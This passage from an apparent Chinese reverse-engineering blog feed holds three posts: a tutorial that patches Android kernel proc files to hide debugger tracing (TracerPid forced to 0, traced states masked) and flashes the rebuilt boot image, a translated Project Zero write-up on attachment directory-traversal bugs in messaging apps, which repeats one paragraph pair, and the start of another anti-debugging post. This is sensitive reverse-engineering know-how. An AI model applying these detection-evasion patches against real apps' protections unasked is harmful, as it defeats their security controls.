到这里我们的修改就彻底结束了。<br><img src="https://i.imgur.com/dU8GVIZ.png" alt></p><h3 id="修改msm-fs-proc-base-c文件"><a href="#修改msm-fs-proc-base-c文件" class="headerlink" title="修改msm/fs/proc/base.c文件"></a>修改<code>msm/fs/proc/base.c</code>文件</h3><p>在Ubuntu中编辑文件<code>vim msm/fs/proc/base.c</code>, 定位函数<code>proc_pid_wchan</code>(大概在268行左右)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">267 static int proc_pid_wchan(struct task_struct *task, char *buffer)</span><br><span class="line">268 &#123;</span><br><span class="line">269        unsigned long wchan;</span><br><span class="line">270        char symname[KSYM_NAME_LEN];</span><br><span class="line">271</span><br><span class="line">272        wchan = get_wchan(task);</span><br><span class="line">273</span><br><span class="line">274        if (lookup_symbol_name(wchan, symname) &lt; 0)</span><br><span class="line">275                if (!ptrace_may_access(task, PTRACE_MODE_READ))</span><br><span class="line">276                        return 0;</span><br><span class="line">277                else</span><br><span class="line">278                        return sprintf(buffer, &quot;%lu&quot;, wchan);</span><br><span class="line">279        else</span><br><span class="line">280                return sprintf(buffer, &quot;%s&quot;, symname);</span><br><span class="line">281 &#125;</span><br></pre></td></tr></table></figure></p><p>改成下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static int proc_pid_wchan(struct task_struct *task, char *buffer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long wchan;</span><br><span class="line">    char symname[KSYM_NAME_LEN];</span><br><span class="line"></span><br><span class="line">    wchan = get_wchan(task);</span><br><span class="line"></span><br><span class="line">    if (lookup_symbol_name(wchan, symname) &lt; 0)</span><br><span class="line">        if (!ptrace_may_access(task, PTRACE_MODE_READ))</span><br><span class="line">            return 0;</span><br><span class="line">        else</span><br><span class="line">            return sprintf(buffer, &quot;%lu&quot;, wchan);</span><br><span class="line">    else</span><br><span class="line">    &#123;   // 更改的内容</span><br><span class="line">        if(strstr(symname,&quot;trace&quot;))</span><br><span class="line">            return sprintf(buffer, &quot;%s&quot;, &quot;sys_epoll_wait&quot;);</span><br><span class="line">        return sprintf(buffer, &quot;%s&quot;, symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="修改msm-fs-proc-array-c文件"><a href="#修改msm-fs-proc-array-c文件" class="headerlink" title="修改msm/fs/proc/array.c文件"></a>修改<code>msm/fs/proc/array.c</code>文件</h3><p>用vim对<code>msm/fs/proc/array.c</code>进行编辑, 先修改第一处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">134 static const char * const task_state_array[] 135 = &#123;</span><br><span class="line">136        &quot;R (running)&quot;,          /*   0 */</span><br><span class="line">137        &quot;S (sleeping)&quot;,         /*   1 */</span><br><span class="line">138        &quot;D (disk sleep)&quot;,       /*   2 */</span><br><span class="line">139        &quot;T (stopped)&quot;,          /*   4 */</span><br><span class="line">140        &quot;t (tracing stop)&quot;,     /*   8 */</span><br><span class="line">141        &quot;Z (zombie)&quot;,           /*  16 */</span><br><span class="line">142        &quot;X (dead)&quot;,             /*  32 */</span><br><span class="line">143        &quot;x (dead)&quot;,             /*  64 */</span><br><span class="line">144        &quot;K (wakekill)&quot;,         /* 128 */</span><br><span class="line">145        &quot;W (waking)&quot;,           /* 256 */</span><br><span class="line">146 &#125;;</span><br></pre></td></tr></table></figure></p><p>修改之后的结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">134 static const char * const task_state_array[] 135 = &#123;</span><br><span class="line">136        &quot;R (running)&quot;,          /*   0 */</span><br><span class="line">137        &quot;S (sleeping)&quot;,         /*   1 */</span><br><span class="line">138        &quot;D (disk sleep)&quot;,       /*   2 */</span><br><span class="line">            //修改的部分</span><br><span class="line">139        &quot;S (sleeping)&quot;,         /*   4 */</span><br><span class="line">140        &quot;S (sleeping)&quot;,         /*   8 */</span><br><span class="line">141        &quot;Z (zombie)&quot;,           /*  16 */</span><br><span class="line">142        &quot;X (dead)&quot;,             /*  32 */</span><br><span class="line">143        &quot;x (dead)&quot;,             /*  64 */</span><br><span class="line">144        &quot;K (wakekill)&quot;,         /* 128 */</span><br><span class="line">145        &quot;W (waking)&quot;,           /* 256 */</span><br><span class="line">146 &#125;;</span><br></pre></td></tr></table></figure></p><p>修改<code>array.c</code>的第二处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">191            ppid, tpid,</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p><p>修改的结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">180 seq_printf(m,</span><br><span class="line">181            &quot;State:\t%s\n&quot;</span><br><span class="line">182            &quot;Tgid:\t%d\n&quot;</span><br><span class="line">183            &quot;Pid:\t%d\n&quot;</span><br><span class="line">184            &quot;PPid:\t%d\n&quot;</span><br><span class="line">185            &quot;TracerPid:\t%d\n&quot;</span><br><span class="line">186            &quot;Uid:\t%d\t%d\t%d\t%d\n&quot;</span><br><span class="line">187            &quot;Gid:\t%d\t%d\t%d\t%d\n&quot;,</span><br><span class="line">188            get_task_state(p),</span><br><span class="line">189            task_tgid_nr_ns(p, ns),</span><br><span class="line">190            pid_nr_ns(pid, ns),</span><br><span class="line">               //修改部分</span><br><span class="line">191            ppid, 0,</span><br><span class="line">192            cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid,</span><br><span class="line">193            cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid);</span><br></pre></td></tr></table></figure></p><h2 id="源码的编译运行"><a href="#源码的编译运行" class="headerlink" title="源码的编译运行"></a>源码的编译运行</h2><p>在编译运行之前, 我们需要先用<code>echo $PATH</code>确认交叉编译器在PATH中。<br><img src="https://i.imgur.com/VfALUlJ.png" alt></p><p>按照下面来进行配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ export ARCH=arm #指明目标体系架构，arm、x86、arm64</span><br><span class="line">$ export SUBARCH=arm</span><br><span class="line">$ cd msm #进入内核所在目录</span><br><span class="line">$ make hammerhead_defconfig # 设备名_defconfig</span><br><span class="line">#指定使用的交叉编译器的前缀</span><br><span class="line">$ make ARCH=arm CROSS_COMPILE=arm-eabi- -j4 ##如果没有gcc的环境, 就增加了CC=clang</span><br></pre></td></tr></table></figure></p><p>可以从<a href="https://source.android.com/source/building-kernels.html" target="_blank" rel="noopener">编译内核</a>这篇文章中找到相应的设备名。</p><p>在编译的过程中, 遇到了下面的报错。<br><img src="https://i.imgur.com/WrDEZh8.png" alt></p><p>这时候需要修改<code>kernel/timeconst.pl</code>文件, 用<code>vim kernel/timeconst.pl</code>编辑该文件, 定位到下述代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">372     @val = @&#123;$canned_values&#123;$hz&#125;&#125;;           </span><br><span class="line">373     if (!defined(@val)) &#123;                     </span><br><span class="line">374         @val = compute_values($hz);           </span><br><span class="line">375     &#125;                                         </span><br><span class="line">376     output($hz, @val);</span><br></pre></td></tr></table></figure></p><p>将<code>if (!defined(@val))</code>改为<code>if (!@val)</code>, 再编译一次就可以了。<br><img src="https://i.imgur.com/sTmrBvr.png" alt><br>接下来, 就按照上图提示进入目录<code>arch/arm/boot</code>。<br><img src="https://i.imgur.com/ytyQvDO.png" alt></p><h3 id="重打包boot-img"><a href="#重打包boot-img" class="headerlink" title="重打包boot.img"></a>重打包boot.img</h3><p>为了防止发生不可挽回的刷砖错误, 在刷机之前, 一定要按照<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">尝试绕过TracePid反调试</a>将boot.img进行备份。</p><h4 id="准备好bootimg-tools工具"><a href="#准备好bootimg-tools工具" class="headerlink" title="准备好bootimg-tools工具"></a>准备好bootimg-tools工具</h4><p>因为我之前Windows环境是准备好了的, 就直接在本地解决下面的任务。</p><p>在Ubuntu环境中, 输入下面命令就准备完成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/pbatard/bootimg-tools.git</span><br><span class="line">$ make</span><br><span class="line">$ cd mkbootimg</span><br></pre></td></tr></table></figure></p><p>Windows环境下进入<code>[MinGW安装的目录]]\MinGW\msys\1.0</code>目录下, 双击<code>msys.bat</code>。</p><p>把<a href="https://www.52pojie.cn/thread-917096-1-1.html" target="_blank" rel="noopener">提取出来的boot.img</a>放到mkbootimg文件夹下, 之后的步骤不管是哪个环境下都是相同的。</p><h4 id="用unmkbootimg解包"><a href="#用unmkbootimg解包" class="headerlink" title="用unmkbootimg解包"></a>用unmkbootimg解包</h4><p>在MinGW输入命令<code>./unmkbootimg -i boot.img</code>, 如果是Ubuntu, 直接去掉前面的<code>./</code>执行命令。</p><p>我们获得了rebuild需要输入的指令, 之后要rebuild的时候要修改一下才能用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">To rebuild this boot image, you can use the command:</span><br><span class="line">  mkbootimg --base 0 --pagesize 2048 --kernel_offset 0x00008000 --ramdisk_offset 0x02900000 --second_offset 0x00f00000 --tags_offset 0x02700000 --cmdline &apos;console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1&apos; --kernel kernel --ramdisk ramdisk.cpio.gz -o boot.img</span><br></pre></td></tr></table></figure></p><h4 id="替换kernel重新打包"><a href="#替换kernel重新打包" class="headerlink" title="替换kernel重新打包"></a>替换kernel重新打包</h4><p><img src="https://i.imgur.com/EAnFtOB.png" alt></p><h4 id="刷入bootnew-img"><a href="#刷入bootnew-img" class="headerlink" title="刷入bootnew.img"></a>刷入bootnew.img</h4><p>在手机开机的情况下, 进入bootnew.img存放的目录输入下述命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot flash boot bootnew.img</span><br><span class="line">$ fastboot reboot</span><br></pre></td></tr></table></figure></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>现在到了见证奇迹的时刻了<br><img src="https://i.imgur.com/pkdj3P3.png" alt></p><h2 id="参考文章或其他链接"><a href="#参考文章或其他链接" class="headerlink" title="参考文章或其他链接"></a>参考文章或其他链接</h2><p><a href="http://www.cnblogs.com/a2211009/p/4265225.html" target="_blank" rel="noopener">Ubuntu 安装 JDK 7 / JDK8 的两种方式</a><br><a href="https://blog.csdn.net/zhandoushi1982/article/details/50807282" target="_blank" rel="noopener">在Ubuntu中通过update-alternatives切换java版本</a><br><a href="https://blog.csdn.net/XXOOYC/article/details/85679143" target="_blank" rel="noopener">编译Android 9.0内核源码并刷入手机</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">Android系统内核编译及刷机实战 （修改反调试标志位）</a><br><a href="https://source.android.com/setup/build/initializing" target="_blank" rel="noopener">搭建编译环境</a><br><a href="https://appuals.com/how-to-build-a-custom-android-kernel/" target="_blank" rel="noopener">How to Build a Custom Android Kernel</a><br><a href="https://blog.csdn.net/fly_hps/article/details/86172698" target="_blank" rel="noopener">Android源码定制添加反反调试机制</a><br><a href="https://pan.baidu.com/s/1K5LU-h8npuczj4JgjKkaWw" target="_blank" rel="noopener">Java6+Java7链接</a>  提取码：ma3i</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;绕过TracePid反调试二&quot;&gt;&lt;a href=&quot;#绕过TracePid反调试二&quot; class=&quot;headerlink&quot; title=&quot;绕过TracePid反调试二&quot;&gt;&lt;/a&gt;绕过TracePid反调试二&lt;/h1&gt;&lt;p&gt;第一篇文章是直接修改二进制文件&lt;a href
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="http://Se8S0n.github.io.git/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Google Zero团队：Android流行通讯APP中的BUG</title>
    <link href="http://Se8S0n.github.io.git/2019/03/31/%E7%94%A8Android%E9%80%9A%E8%AE%AFAPP%E5%8F%91%E6%B6%88%E6%81%AF%E5%8F%91%E7%8E%B0%E7%9A%84BUG/"/>
    <id>http://Se8S0n.github.io.git/2019/03/31/用Android通讯APP发消息发现的BUG/</id>
    <published>2019-03-31T22:29:29.000Z</published>
    <updated>2021-08-05T06:51:27.431Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址:<a href="https://googleprojectzero.blogspot.com/2019/03/android-messaging-few-bugs-short-of.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/03/android-messaging-few-bugs-short-of.html</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大概一年半以前, 我对 Android的通讯和邮件客户端进行了一些测试。当时, 在这些客户端中发现了一些bug, 然而没能把这些bug组合成有效的攻击链, 所以没有将成果发到博客上。不过, 和当初想公布研究成果的想法不同, 我现在决定将研究成果分享出来。毕竟, 了解(客户端的)设计上的抉择会对安全造成什么影响, 也是一件有趣的事情。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>在研究过程中, 对Messages (Android默认的短信客户端)、 Android上的Gmail客户端、 微软 Outlook, Facebook Messenger, WhatsApp、 Signal和Telegram这些是Google Play上最流行的通讯和邮件客户端进行了测试。</p><h2 id="通讯客户端说明-体系结构、攻击面、测试方法"><a href="#通讯客户端说明-体系结构、攻击面、测试方法" class="headerlink" title="通讯客户端说明(体系结构、攻击面、测试方法)"></a>通讯客户端说明(体系结构、攻击面、测试方法)</h2><p>从高层次上看, 通讯客户端具有类似的体系结构, 其功能是与服务器进行通讯, 负责定位要与用户通讯的收件人, 通常还要保留通讯过程中的session。消息需要通过服务器, 再由服务器直接发给收件人, 支持端到端加密的客户端可以将消息用某种信封加密技术密封起来。</p><p>不同客户端使用的通讯协议是不一样的, 尽管如此, Facebook Messenger、WhatsApp 和 Telegram 还是有相似的地方的, 这些客户端通讯协议都是采用分层方法实现的, 使用该方法发送的消息可以在一个层次结构包含类型不同的字段。 Telegram使用的<a href="https://core.telegram.org/schema" target="_blank" rel="noopener">通讯协议</a>是公开的, 用它发送出的一条消息就同时包含了发送给服务器端和接收者的信息。</p><p>一开始，我从Facebook messenger处理未加密信息的方式入手, 没想到, 这个攻击思路颇具挑战性。发送消息的协议(如mobile和 WEB API)有挺多可以用的, 再加上在目标设备接收到消息之前消息还会经过大量处理, 这两点大大提升了找到客户端中可攻击点的难度。因此, 我决定将重点放在加密后的消息上, 因为服务器不能过滤这些邮件。</p><p>我没有 Facebook Messenger和 WhatsApp 的源码, 所以我只能用apktool从这些应用的APK文件中提取出smali代码来进行分析。Signal协议的普及简化了找这些应用程序的加密部分的步骤, 因为可以直接在 libsignal 中搜索字符串。之后, 我添加了一个发送消息的函数， 将消息发送到我的服务器上, 该函数还允许在加密之前对消息进行更改的选项, 这样我就可以用格式错误的加密消息来进行测试。</p><p>比起上面两个客户端, 测试邮件和SMS客户端会显得稍微容易些。在测试SMS客户端时, 我调用了<a href="https://developer.android.com/reference/android/telephony/SmsManager.html#sendDataMessage(java.lang.String,%20java.lang.String,%20short,%20byte%5B%5D,%20android.app.PendingIntent,%20android.app.PendingIntent" target="_blank" rel="noopener">sendDataMessage</a> API发送原始的SMS 消息。而在测试邮件客户端时, 可以直接使用 SMTP 服务器发送 MIME 邮件。</p><h2 id="研究结果提要"><a href="#研究结果提要" class="headerlink" title="研究结果提要"></a>研究结果提要</h2><p>有一点需要注意一下, 这些结果已超过一年, 并且通讯app的客户端的代码已有较大改动, 因此现在测试结果可能会有所不同。本文中提及漏洞均已修复。</p><h3 id="Messages"><a href="#Messages" class="headerlink" title="Messages"></a>Messages</h3><p>Android默认的Messages客户端主要是用 Java写的, 使用 AOSP SMS和MMS来解析消息。因此, Messages几乎不存在内存损坏漏洞。不过Android 会以不同的方式处理一些特殊的 SMS 消息, 解析这些特殊SMS消息有可能会产生漏洞。某些特殊的消息会被被解析为符合可视化语音信箱的<a href="http://www.omtp.org/OMTP_VVM_Specification_v1_3_Final.pdf" target="_blank" rel="noopener">OMTP</a>规范的信息, 而处理这些消息的过程以及可视化语音信箱的IMAP功能是 Java 实现的。在过去，Android曾经支持SUPL协议(用于 GPS 星历更新的 SMS 协议)在用户空间中解析, 并且进行解析工作的intent对象是存储在 SMS客户端堆栈中。但是, 现在高通的基带就可以直接处理这些消息, 因此处理过程不会在新的设备上的用户空间中进行。Messages客户端中存在的漏洞的主要是由处理媒体文件的库引发的, 过去大多漏洞都是在这些组件中发现的, 然而与之前相比，最近爆出的这样的漏洞少多了,再加上media是由低特权进程处理的。所以，目前我没有在Messages中发现任何漏洞。</p><h3 id="Gmail"><a href="#Gmail" class="headerlink" title="Gmail"></a>Gmail</h3><p>Gmail 应用程序可处理由IMAP、POP 或其他服务器发出的 MIME 消息, 这些消息的内容通常直接由非Gmail用户发出, 不过Gmail的邮件服务器还是能过滤掉一些邮件的。Gmail的客户端会调用AOSP 中的实现邮件协议底层API, 这些API和Gmail的客户端都是用Java实现的。在Gmail的客户端中, 我发现了一个由附件上传引发的目录遍历的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1342" target="_blank" rel="noopener">bug</a>。</p><h3 id="Outlook"><a href="#Outlook" class="headerlink" title="Outlook"></a>Outlook</h3><p>微软 Outlook 客户端的功能和Gmail的差不太多, 同样会处理另一台服务器发送的 MIME消息, 但其所有协议的处理过程都是由客户端中的代码完成的。Outlook主要是用 Java写的, 其中的native的功能和邮件本身没多大关系。和在Gmail中一样，Outlook也存在着相似<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1356" target="_blank" rel="noopener">目录遍历漏洞</a>。</p><h3 id="Facebook-Messenger"><a href="#Facebook-Messenger" class="headerlink" title="Facebook Messenger"></a>Facebook Messenger</h3><p>与我测试的其他通讯客户端相比, Facebook messenger 的工程量挺大的了, 很多代码很难明确其功能。该应用中包含大量的native库, 几乎每天都要从 Facebook 服务器重新加载数据动态更新。不过, 这些库好像很少直接参与消息的处理。</p><p>Facebook Messenger使用一种叫 “消息队列遥测传输 (<a href="http://mqtt.org/" target="_blank" rel="noopener">MQTT</a>)” 的协议与服务器进行通信——MQTT 的底层是开源的<a href="https://github.com/facebook/fbthrift/tree/master/thrift/lib/java/thrift/src/main/java/com/facebook/thrift/protocol" target="_blank" rel="noopener">Thrift协议</a>。应用中实现该协议的有Java 和 c++ 两种的库, 但好像只用了 Java 的库。我检查了协议相关代码, 没有发现Facebook Messenger的漏洞。</p><h3 id="WhatsApp"><a href="#WhatsApp" class="headerlink" title="WhatsApp"></a>WhatsApp</h3><p>WhatsApp 使用的分层协议主要是用 Java 实现的，该应用处理语音和视频呼叫请求的消息代码是在native代码中实现的, 我在我写的<a href="https://googleprojectzero.blogspot.com/2018/12/adventures-in-video-conferencing-part-4.html" target="_blank" rel="noopener">一篇文章</a>中讨论了相关内容。目前，我没有在 WhatsApp发现任何漏洞。</p><h3 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h3><p>Telegram是<a href="https://github.com/DrKLO/Telegram" target="_blank" rel="noopener">开源</a>的, 其 API代码是公开的。其中有相当多的native代码, 但该部分代码主要用于设备到服务器通信, 而不是端对端通信。因此，远程攻击者可用的攻击面几乎都在 Java 中。在Telegram中, 我发现了一个<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1470" target="_blank" rel="noopener">bug</a>, 同样是一个与附件相关的目录遍历漏洞。</p><h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>Signal主要由 Java实现, 攻击面相当小。虽然, 它使用的通讯协议有很好的文档记录。但是, 我没有在其中的任何漏洞。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>总的来说, 我在这些客户端中一共发现了三个目录遍历漏洞。这些漏洞惊人地相似, 都与附件名有关，是由附件在下载时允许附件名包含特殊字符造成的。目录遍历问题在 Android 应用中非常常见,造成该漏洞的部分原因应该是 Java API 在文件名方面处理得不够严谨。</p><p>不过, 这些漏洞具有局限性。首先, Gmail 和 Outlook 邮件客户端中的bug仅在客户端与非标准电子邮件地址一起使用时才起作用 (即 Gmail 与非 Gmail 帐户一起使用, 或者 Outlook 与非 outlook 电子邮件地址一起使用)。虽然，Gmail 和 Outlook 邮件客户端都经常与非标准电子邮件地址一起使用, 但这些漏洞不会影响每个用户。并且想要利用这些漏洞， 还需要用户进行下载附件的操作。</p><p>该漏洞的利用还有一些限制条件。比如, 想要利用这些漏洞不能覆盖存在的文件, 只能往里面写入新文件。因此, 攻击者需要在某个地方放置系统可以处理但不存在的文件。但Android 上的应用程序权限有限, 通常不能在其应用程序目录之外写入。</p><p>上面失败之后,又有了一个绝妙的idea进入到我脑子里, 通过利用SQLite 中漏洞实现攻击, 因为Gmail 和 Outlook 都使用 SQLite 数据库来存储数据。SQLite 支持日志记录, 这意味着当 SQLite 数据库发生更改时, 会先写到日志文件里面, 防止在写入过程中系统崩溃或断电时数据库的数据丢失。如果发生系统崩溃或断电的情况, 在下次访问数据库时，就会存在一个保存着更改信息日志文件, 这时SQLite就知道要还原已更改信息。一旦信息还原完成, 日志文件就会被删除。这意味着, 可以通过在同一目录下写入具有特定名称的日志文件来更改SQLite数据库, 也满足此文件在一般情况下不存在的条件。</p><p>我尝试过这个方法, 并且更改了数据库, 但只能改变用户在应用中看到的邮件, 不能进行提权或执行非法操作。为了寻找更通用的方法, 我想到了可以从SQLite 解析日志文件或数据库文件的方式下手。</p><p>Telegram的漏洞有可能直接利用, 因为恰好有一个默认情况下不存在的配置文件, 如果该配置文件存在的话， Telegram可对处理该配置文件, 并且在处理代码中会引发一个内存损坏漏洞。不过, 我找不到一个可实现该攻击方法的邮件客户端。</p><p>上面失败之后,又有了一个绝妙的idea进入到我脑子里, 通过利用SQLite 中漏洞实现攻击, 因为Gmail 和 Outlook 都使用 SQLite 数据库来存储数据。SQLite 支持日志记录, 这意味着当 SQLite 数据库发生更改时, 会先写到日志文件里面, 防止在写入过程中系统崩溃或断电时数据库的数据丢失。如果发生系统崩溃或断电的情况, 在下次访问数据库时，就会存在一个保存着更改信息日志文件, 这时SQLite就知道要还原已更改信息。一旦信息还原完成, 日志文件就会被删除。这意味着, 可以通过在同一目录下写入具有特定名称的日志文件来更改SQLite数据库, 也满足此文件在一般情况下不存在的条件。</p><p>我尝试过这个方法, 并且更改了数据库, 但只能改变用户在应用中看到的邮件, 不能进行提权或执行非法操作。为了寻找更通用的方法, 我想到了可以从SQLite 解析日志文件或数据库文件的方式下手。</p><p>我用 AFL 对数据库的加载和日志处理进行了Fuzzing测试。我发现<a href="https://sqlite.org/src/info/02828d717e2d97b1" target="_blank" rel="noopener">四个漏洞</a>, 其中三个我认为是不可利用的, 剩下一个利用的可能性非常小。</p><p>我找不到更多的方法来利用目录遍历, 因为不能覆盖 Android 应用程序中的文件, 所以我不认为这些目录遍历漏洞对攻击者来说会特别有价值。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我测试了几个 Android 通讯和邮件客户端，发现了三个目录遍历的漏洞, 但这些漏洞的利用存在一些限制, 现在还不清楚在一般情况下这些漏洞能否被利用。</p><p>这些漏洞非常相似, 箭头直指Android中 Java未能正确处理文件路径方面的问题。仅在客户端与非标准电子邮件地址一起使用时, 邮件客户端中的两个漏洞才能被成功利用，尽管这种应用场景非常常见。漏洞的产生可能是邮件客户端的功能测试不足或审查不足造成的。大部分通讯客户端是用 Java 实现的, 这就增加了在应用程序中找到bug的难度, 因为不能利用内存损坏漏洞进行攻击。</p><p>这项研究的着重点是未经过中间件处理的邮件和消息, 攻击者可以利用这个bug向接收者发送任意数据, 客户端不会对小心进行过滤且会对数据直接进行处理。虽然这些漏洞利用起来很容易, 但它们只是消息或邮件客户端攻击面中的一部分。在将来，我很可能会投入到通讯客户端的中介服务器的功能的研究中去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文地址:&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/android-messaging-few-bugs-short-of.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;htt
      
    
    </summary>
    
    
      <category term="Android安全 翻译" scheme="http://Se8S0n.github.io.git/tags/Android%E5%AE%89%E5%85%A8-%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>尝试绕过TracerPID反调试</title>
    <link href="http://Se8S0n.github.io.git/2019/03/14/%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87TracerPID%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%80/"/>
    <id>http://Se8S0n.github.io.git/2019/03/14/尝试绕过TracerPID反调试一/</id>
    <published>2019-03-14T23:31:14.000Z</published>
    <updated>2021-08-05T06:51:27.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="Windows下Linux环境准备"><a href="#Windows下Linux环境准备" class="headerlink" title="Windows下Linux环境准备"></a>Windows下Linux环境准备</h2><h3 id="安装MinGW"><a href="#安装MinGW" class="headerlink" title="安装MinGW"></a>安装MinGW</h3><p>在官网下好<a href="http://www.mingw.org/" target="_blank" rel="noopener">MinGW</a>之后, 右键按下图选中要下载的，之后直接在<code>Installation</code>中直接选中<code>Apply change</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552553170/aa_catmea.png" alt></p><p>###<br>进入安装目录<code>&lt;MinGW安装的地方&gt;\MinGW\bin</code>, 将<code>gcc.exe</code>重命名为<code>cc.exe</code>, 就短暂地这样改就好了，之后用完make工具再改回来。反正我没找到哪里可以改Makefile的内容。不这样修改的话会出现如下报错：</p><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552554377/boerror_ltdeqw.png" alt></p><p>具体原因好像是MinGW的bug, 在Linux环境下一般gcc是等同于cc的, 然而在Windows中却不是这样的, 如果有人找到Makefile的内容可以在哪里改的话, 可以告诉我=v=, 虽然下面并没有可以评论的地方。</p><p><em>注：还有千万别学人家瞎改名, 把<code>mingw-make.exe</code>改成<code>make.exe</code>直接用, 这样也会报错！</em></p><h2 id="准备boot"><a href="#准备boot" class="headerlink" title="准备boot"></a>准备boot</h2><ol><li>提取boot.img <figure 